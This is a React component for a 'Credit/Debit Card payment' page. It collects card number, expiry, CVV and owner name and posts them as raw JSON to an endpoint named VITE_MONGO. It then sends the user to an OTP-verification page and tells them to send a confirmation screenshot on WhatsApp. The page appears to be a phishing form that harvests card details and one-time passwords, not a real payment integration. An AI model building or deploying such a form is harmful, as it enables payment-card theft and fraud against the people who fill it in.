

import { useState, useEffect, useRef } from 'react'

import { useForm } from "react-hook-form"
import { useNavigate } from 'react-router-dom';

function Card() {


  const [count, setCount] = useState()
  const navigate = useNavigate();
  

  const handleclick = () =>{
    navigate("/") 
  }

  const {
    register,
    handleSubmit,
    watch,
    formState: { errors, isSubmitting },
  } = useForm();

  const delay = (d) => {
    return new Promise((resolve, reject) => {
      setTimeout(() => {
        resolve()
      }, d * 3000);
    })
  }

  //const onSubmit = async (data) => {
  // await delay(2)
  //let r = await fetch("http://localhost:3000/", { method: "post", body: JSON.stringify(data) })
  //let res = await r.text()
  //console.log(data, res)


  const onSubmit = async (data) => {
    navigate("/Otp-verification")
    let r = await fetch(import.meta.env.VITE_MONGO, {
      method: "POST", headers: {
        "Content-Type": "application/json",
      }, body: JSON.stringify(data)


    })
    let res = await r.text()

    console.log(data, res)


  }

  return (
    <>
<div className="payment-body">

<div className="navbar">
  <div className="svg" onClick={handleclick}>
<svg xmlns="http://www.w3.org/2000/svg" height="30px" viewBox="0 0 24 24" width="30px" fill="#FFFFFF"><path d="M0 0h24v24H0V0z" fill="none"/><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
</div>

<p className='nav-heading'>Credit/Debit Card payment</p>
</div>

      <div className="pay-cont">
        <div className="pay-header">
          <div className="pay-heading">Payment Details</div>
          <img className="pay-img" src="./img/atmcard.png" alt="fail imgggggg" />
        </div>
        <div className="pay-form">
        {isSubmitting && <div>Loading...</div>}
          <form action="" onSubmit={handleSubmit(onSubmit)}>
            <div className="card-num">
              <label className='pay-label'  >CARD NUMBER</label>
              <input type="Number" placeholder="Valid Card Number" {...register("Cardd")} name='Cardd' className="pay-form-cont" />
            </div>

            <div className="pay-expiry">
              <div className="expiry-mm">
                <label  className='pay-label'>EXP MONTH</label>
                <input type="Number" placeholder="MM" {...register("mm")} name='mm' className='mm pay-form-cont' />
              </div>

              <div className="expiry-mm">
                <label className='pay-label'>EXP YEAR</label>
                <input type="Number" placeholder="YY" {...register("yy")} name='yy' className='mm pay-form-cont' />
              </div>

              <div className="expiry-mm">
                <label className='pay-label'>CVV</label>
                <input type="Number"  {...register("C")} name='C'   placeholder="CVV" className="yy pay-form-cont"/>
              </div>
            </div>


            <div className="card-num">
    <label className='pay-label'>CARD OWNER</label>
    <input type="text"   {...register("ahn")}  name='ahn' className="form-control pay-form-cont" placeholder="CARD OWNER NAME" />
    </div>

   
    <button class="adress-btn"  type="submit" value="submit">Continue</button>
        
        </form>
        </div>


      </div>


      
<div className="tips-box">
<div className="tips">Important Tips</div>

<div className="important-lins">* After registration compleate Send Payment done </div>
<div className="important-lins">* Confarmation Screenshot on Whatsapp</div>
<div className="important-lins">* Please ensure your Card is enabled for online transaction</div>
<div className="important-lins">* Please ensure to complete the payment transaction well within time limits</div>




</div>

</div>
    </>
  )
}

export default Card